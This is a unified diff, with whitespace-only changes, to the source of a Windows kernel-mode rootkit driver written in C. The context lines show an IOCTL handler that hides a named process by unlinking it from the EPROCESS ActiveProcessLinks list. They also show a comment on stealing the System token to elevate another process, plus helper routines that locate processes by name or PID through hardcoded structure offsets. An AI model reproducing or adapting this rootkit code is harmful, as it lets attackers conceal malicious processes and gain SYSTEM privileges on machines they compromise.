@@ -53,11 +53,11 @@ NTSTATUS IoControlFunction(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
 	int pBufLen, iReturn = 0;
 	unsigned long token;
 
-	/* Init */	
+    /* Init */	
 	IrpSp = IoGetCurrentIrpStackLocation(Irp);
 	FunctionCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;
 
-    	/* Execute the request from user-land depending of the IOCTL */   
+    /* Execute the request from user-land depending of the IOCTL */   
 	switch(FunctionCode)
 	{
 		 /* Hide a process from the doubly-linked list EPROCESS */
@@ -68,23 +68,23 @@ NTSTATUS IoControlFunction(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
 			*(pBuf + pBufLen) = '\0';
 			if (hideProcess(pBuf) == 0)
 			{
-				pBufLen += 26;
-               			if (pBufLen > 1024)
-                  			pBufLen = 1024;
-               			_snprintf(output, (size_t) pBufLen, "the process %s is now hidden", pBuf);
-               			RtlCopyMemory(pBuf , output, strlen(output));
-            		}
-            		else
-            		{
-               			pBufLen += 28;
-               			if (pBufLen > 1024)
-                  			pBufLen = 1024;                
-               			_snprintf(output, (size_t) pBufLen, "unable to hide the process %s ", pBuf);
-               			RtlCopyMemory(pBuf , output, strlen(output));
-            		}
-            		Irp->IoStatus.Status = STATUS_SUCCESS;
-            		Irp->IoStatus.Information = strlen(output);
-            		break;
+               pBufLen += 26;
+               if (pBufLen > 1024)
+                  pBufLen = 1024;                    
+               _snprintf(output, (size_t) pBufLen, "the process %s is now hidden", pBuf);
+               RtlCopyMemory(pBuf , output, strlen(output));
+            }
+            else
+            {
+               pBufLen += 28;
+               if (pBufLen > 1024)
+                  pBufLen = 1024;                
+               _snprintf(output, (size_t) pBufLen, "unable to hide the process %s ", pBuf);
+               RtlCopyMemory(pBuf , output, strlen(output));
+            }
+			Irp->IoStatus.Status = STATUS_SUCCESS;
+			Irp->IoStatus.Information = strlen(output);
+			break;
  
 		/* Steal the token of the process System and set it for the given process */
 		case IOCTL_ELEVATION_PROCESS:
@@ -114,11 +114,11 @@ NTSTATUS IoControlFunction(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
 			break;
 
 		/* Hide the driver from the doubly-linked list MODULE_ENTRY */
-        	case IOCTL_HIDE_ROOTKIT:
-            		break;
+        case IOCTL_HIDE_ROOTKIT:
+            break;
 
 		default: 
-            		break;
+            break;
 	}
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
@@ -129,13 +129,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegist
 {
 	int i;
 	NTSTATUS ntStatus;
-	UNICODE_STRING deviceNameUnicodeString;
+    UNICODE_STRING deviceNameUnicodeString;
 	
 	/* Init */
 	RtlInitUnicodeString(&deviceNameUnicodeString, deviceNameBuffer);
 	RtlInitUnicodeString(&deviceLinkUnicodeString, deviceLinkBuffer);
 
-    	/* Create device */
+    /* Create device */
 	ntStatus = IoCreateDevice(pDriverObject, 0, &deviceNameUnicodeString, 0x0001234, 0, TRUE, &g_RootkitDevice );
 	if (NT_SUCCESS(ntStatus))
 	{
@@ -144,13 +144,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegist
 			return 1;
 	}
 
-	/* Set unload function */
+    /* Set unload function */
 	pDriverObject->DriverUnload = DriverUnload;
 	
 	/* Set major functions */
 	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
 		pDriverObject->MajorFunction[i] = OnStubDispatch;
-	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlFunction;		
+    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlFunction;		
 
 	return STATUS_SUCCESS;
 }
@@ -169,12 +169,12 @@ PEPROCESS searchProcessByName(char *processName)
     if (!strncmp(((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), processName, 
          strlen(((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET))))
     {
-	/* Debug message */
-      	DbgPrint("@EPROCESS : 0x%X -  @ActiveProcessLinks : 0x%X - ImageFilename : %s - PID : %d\n", 
-		currentProcess, ((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET), 
-		((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), 
+	  /* Debug message */
+      DbgPrint("@EPROCESS : 0x%X -  @ActiveProcessLinks : 0x%X - ImageFilename : %s - PID : %d\n", 
+				currentProcess, ((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET), 
+				((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), 
                 *((int *)((PUCHAR) currentProcess + PID_OFFSET)));
-      	return currentProcess;
+      return currentProcess;
     }
 
     /* Get the ActiveProcessLinks list of the current process*/
@@ -210,11 +210,11 @@ PEPROCESS searchProcessByPID(int pid)
     
     if (*pid_next == pid)
     {
-    	/* Debug message */
-      	DbgPrint("@EPROCESS : 0x%X -  @ActiveProcessLinks : 0x%X - ImageFilename : %s - PID : %d\n", 
-		currentProcess, ((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET), 
-		((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), *pid_next);
-      	return currentProcess;
+	  /* Debug message */
+      DbgPrint("@EPROCESS : 0x%X -  @ActiveProcessLinks : 0x%X - ImageFilename : %s - PID : %d\n", 
+				currentProcess, ((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET), 
+				((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), *pid_next);
+      return currentProcess;
     }
 
     /* Get the ActiveProcessLinks list of the current process*/
